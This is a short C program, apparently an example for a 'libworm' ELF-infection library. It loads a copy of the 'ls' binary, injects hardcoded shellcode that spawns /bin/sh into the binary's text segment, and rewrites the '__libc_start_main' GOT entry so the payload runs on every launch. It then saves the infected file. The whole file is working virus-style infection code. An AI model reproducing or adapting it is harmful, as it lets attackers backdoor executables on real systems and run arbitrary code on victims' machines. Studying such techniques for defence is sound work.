//
// Created by ulexec on 25/08/18.
//

//
// Created by ulexec on 22/08/18.
//

#include "../worm.h"
#include <stdbool.h>

int main() {
    Elfw_Bin *bin, *infected_bin;
    Elfw_Code *code;
    size_t size;
    int payload_offset;
    int payload_addr;

    /*http://shell-storm.org/shellcode/files/shellcode-806.php*/
    uint8_t shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0"
                          "\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f"
                          "\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    size = sizeof(shellcode)/sizeof(shellcode[0]);

    code = (Elfw_Code *)calloc(sizeof(char), size);
    code->code = shellcode;
    code->size = size;

    if (bin_load_elf (&bin, "/home/ulexec/Desktop/ls", PROT_READ | PROT_WRITE, MAP_PRIVATE) == LIBWORM_ERROR) {
        fprintf (stderr, "bin_load_elf failed");
        return -1;
    }

    if ((inject_text_segment(bin, code, &infected_bin, false, &payload_offset)) == LIBWORM_ERROR) {
        fprintf(stderr, "inject_text_segment Failed\n");
        return -1;
    }

    if((offset_to_addr(infected_bin, payload_offset, &payload_addr)) == LIBWORM_ERROR) {
        fprintf(stderr, "offset_to_addr Failed\n");
        return -1;
    }

    printf("Payload addr: 0x%lx\n", payload_addr);

    if(set_symbol_got_entry(infected_bin, (uint8_t *) "__libc_start_main", (PtrW(uint)) payload_addr) == LIBWORM_ERROR) {
        fprintf(stderr, "set_symbol_got_entry failed");
        return -1;
    }

    bin_update_elf(infected_bin, bin->size, 0);
    bin_unload_elf(infected_bin);
    bin_unload_elf(bin);
    free(code);
    return 0;
}